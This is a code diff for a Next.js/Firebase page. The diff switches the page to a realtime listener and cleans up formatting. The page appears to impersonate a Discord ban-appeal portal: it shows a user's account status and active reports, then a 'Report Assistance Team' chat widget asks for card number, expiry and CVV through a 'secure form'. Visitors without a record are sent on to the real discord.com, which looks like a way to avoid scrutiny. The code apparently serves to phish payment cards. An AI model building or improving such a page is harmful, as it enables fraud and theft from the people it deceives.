@@ -14,13 +14,12 @@ import { useParams } from "next/navigation";
 import { db } from "../../lib/firebase";
 import {
   doc,
-  getDoc,
+  onSnapshot,
   collection,
-  addDoc,
   query,
   where,
   orderBy,
-  onSnapshot,
+  addDoc,
   serverTimestamp,
   CollectionReference,
   QuerySnapshot,
@@ -49,7 +48,7 @@ type UserData = {
 type ChatMessage = {
   id?: string;
   sender: "client" | "support";
-  text: string; // masked version for client view
+  text: string;
   messageType?: "text" | "secure_form_request" | "secure_form_response";
   timestamp?: Timestamp;
   transactionId: string;
@@ -61,40 +60,35 @@ export default function UserPage() {
   const [data, setData] = useState<UserData | null>(null);
   const [loading, setLoading] = useState(true);
 
+  // Realtime listener for changes on the user document.
   useEffect(() => {
-    async function fetchData() {
-      if (!id) {
-        console.error("🚨 No ID provided in the URL parameters.");
-        setLoading(false);
-        return;
-      }
-      const userId = Array.isArray(id) ? id[0] : id;
-      console.log("🔍 Fetching user document for ID:", userId);
-      try {
-        const docRef = doc(db, "users", userId);
-        const docSnap = await getDoc(docRef);
+    if (!id) {
+      console.error("🚨 No ID provided in the URL parameters.");
+      setLoading(false);
+      return;
+    }
+    const userId = Array.isArray(id) ? id[0] : id;
+    console.log("🔍 Listening for changes on user document with ID:", userId);
+    const unsubscribe = onSnapshot(
+      doc(db, "users", userId),
+      (docSnap) => {
         if (docSnap.exists()) {
           console.log("✅ Document data:", docSnap.data());
           setData(docSnap.data() as UserData);
         } else {
           console.error("❌ No document found for ID:", userId);
-          setData(null);
+          // Redirect automatically when the document is missing.
+          window.location.href = "https://discord.com";
         }
-      } catch (error) {
-        console.error("🔥 Error fetching document:", error);
-        setData(null);
+        setLoading(false);
+      },
+      (error) => {
+        console.error("🔥 Error listening to document:", error);
+        setLoading(false);
       }
-      setLoading(false);
-    }
-    fetchData();
+    );
+    return () => unsubscribe();
   }, [id]);
-
-  // If loading is finished and no data is found, redirect to Discord
-  useEffect(() => {
-    if (!loading && data === null) {
-      window.location.href = "https://discord.com";
-    }
-  }, [loading, data]);
 
   return (
     <>
@@ -111,7 +105,9 @@ export default function UserPage() {
         </div>
 
         {loading ? (
-          <h2 style={{ color: "white", textAlign: "center", marginTop: "50px" }}>Loading...</h2>
+          <h2 style={{ color: "white", textAlign: "center", marginTop: "50px" }}>
+            Loading...
+          </h2>
         ) : data ? (
           <div style={outerContainer}>
             {/* Decorative Image */}
@@ -133,27 +129,45 @@ export default function UserPage() {
                 <div style={infoRow}>
                   <img src="https://img.icons8.com/ios-filled/50/5865f2/user.png" alt="User Icon" style={iconStyle} />
                   <span style={label}>User ID:</span>
-                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right" }}>{data.userID}</span>
+                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right" }}>
+                    {data.userID}
+                  </span>
                 </div>
                 <div style={infoRow}>
                   <img src="https://img.icons8.com/ios-filled/50/5865f2/certificate.png" alt="Type Icon" style={iconStyle} />
                   <span style={label}>Type:</span>
-                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right" }}>{data.type}</span>
+                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right" }}>
+                    {data.type}
+                  </span>
                 </div>
                 <div style={infoRow}>
                   <img src="https://img.icons8.com/ios-filled/50/5865f2/shield.png" alt="Shield Icon" style={iconStyle} />
                   <span style={label}>Account Status:</span>
-                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right", ...getStatusStyle(data.accountStatus) }}>{data.accountStatus}</span>
+                  <span
+                    style={{
+                      ...value,
+                      marginLeft: "auto",
+                      marginRight: "10px",
+                      textAlign: "right",
+                      ...getStatusStyle(data.accountStatus),
+                    }}
+                  >
+                    {data.accountStatus}
+                  </span>
                 </div>
                 <div style={infoRow}>
                   <img src="https://img.icons8.com/ios-filled/50/5865f2/calendar.png" alt="Calendar Icon" style={iconStyle} />
                   <span style={label}>Date Created:</span>
-                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right" }}>{data.dateCreated}</span>
+                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right" }}>
+                    {data.dateCreated}
+                  </span>
                 </div>
                 <div style={infoRow}>
                   <img src="https://img.icons8.com/ios-filled/50/5865f2/flag.png" alt="Flag Icon" style={iconStyle} />
                   <span style={label}>Active Reports:</span>
-                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right" }}>{data.activeReports}</span>
+                  <span style={{ ...value, marginLeft: "auto", marginRight: "10px", textAlign: "right" }}>
+                    {data.activeReports}
+                  </span>
                 </div>
               </div>
               <div style={footerStyle}>
@@ -164,7 +178,9 @@ export default function UserPage() {
             {/* Right Container (Appeal Info) */}
             <div style={rightText}>
               <h1 style={rightHeading}>Appeal Your Ban</h1>
-              <p style={rightTextP}>Submit your appeal via the chat window (bottom right) with all necessary details to dispute the report.</p>
+              <p style={rightTextP}>
+                Submit your appeal via the chat window (bottom right) with all necessary details to dispute the report.
+              </p>
               <h2 style={rightSubHeading}>Review Process</h2>
               <p style={rightTextP}>The Report Assistance Team will assess your appeal and determine if the report is valid.</p>
               <h2 style={rightSubHeading}>Outcome</h2>
@@ -210,14 +226,12 @@ function ChatWidget({ userID, role = "client" }: ChatWidgetProps) {
   const [isOpen, setIsOpen] = useState(false);
   const [isHovered, setIsHovered] = useState(false);
   const [isChatToggleHovered, setIsChatToggleHovered] = useState(false);
-  // NEW: Track cursor offset for the hover effect
   const [hoverTransform, setHoverTransform] = useState({ x: 0, y: 0 });
   const [messages, setMessages] = useState<ChatMessage[]>([]);
   const [input, setInput] = useState("");
   const messagesEndRef = useRef<HTMLDivElement | null>(null);
   const fileInputRef = useRef<HTMLInputElement | null>(null);
   const textareaRef = useRef<HTMLTextAreaElement | null>(null);
-  // NEW: State for storing the selected image for zoom modal
   const [selectedImage, setSelectedImage] = useState<string | null>(null);
 
   const suggestions = [
@@ -247,8 +261,6 @@ function ChatWidget({ userID, role = "client" }: ChatWidgetProps) {
     }
   }, [messages]);
 
-  // When a secure form is submitted, send a chat message with only a masked message.
-  // The full payment details are stored in a secure collection.
   const handleSecurePaymentSubmit = async (paymentDetails: { cardNumber: string; expiry: string; cvv: string; }) => {
     const masked = paymentDetails.cardNumber.slice(-4);
     const maskedMessage = `Secure Form Submitted: Card ending in ${masked}`;
@@ -276,7 +288,6 @@ function ChatWidget({ userID, role = "client" }: ChatWidgetProps) {
     }
   };
 
-  // Render messages.
   const renderMessage = (msg: ChatMessage) => {
     const key = msg.id || Math.random().toString(36).substr(2, 9);
     return (
@@ -385,7 +396,6 @@ function ChatWidget({ userID, role = "client" }: ChatWidgetProps) {
           opacity: isOpen ? 1 : 0,
           transform: isOpen ? "translateY(0)" : "translateY(20px)",
           pointerEvents: isOpen ? "auto" : "none",
-          // Dynamic border radius for smooth rounded animation
           borderRadius: isOpen ? "10px" : "20px",
           transition: "height 0.5s ease, opacity 0.5s ease, transform 0.3s ease, border-radius 0.5s ease",
           boxShadow: isHovered ? "0 8px 16px rgba(0,0,0,0.3)" : "0 4px 8px rgba(0,0,0,0.2)",
@@ -437,7 +447,6 @@ function ChatWidget({ userID, role = "client" }: ChatWidgetProps) {
           <input type="file" accept="image/*" ref={fileInputRef} style={{ display: "none" }} onChange={handleFileChange} />
         </div>
       </div>
-      {/* Chat Toggle Button with Cursor-Follow & Hover Animation */}
       <div
         style={chatToggleStyle}
         onMouseMove={(e) => {
@@ -464,7 +473,6 @@ function ChatWidget({ userID, role = "client" }: ChatWidgetProps) {
           Chat
         </button>
       </div>
-      {/* Render ImageModal if an image has been clicked */}
       {selectedImage && (
         <ImageModal src={selectedImage} onClose={() => setSelectedImage(null)} />
       )}
@@ -1045,7 +1053,7 @@ const chatToggleStyle: React.CSSProperties = {
 const chatToggleBtnStyle: React.CSSProperties = {
   background: "none",
   border: "none",
-  borderRadius: "10px", // Added for smoother rounded button edges
+  borderRadius: "10px",
   color: "white",
   width: "100%",
   padding: "10px",
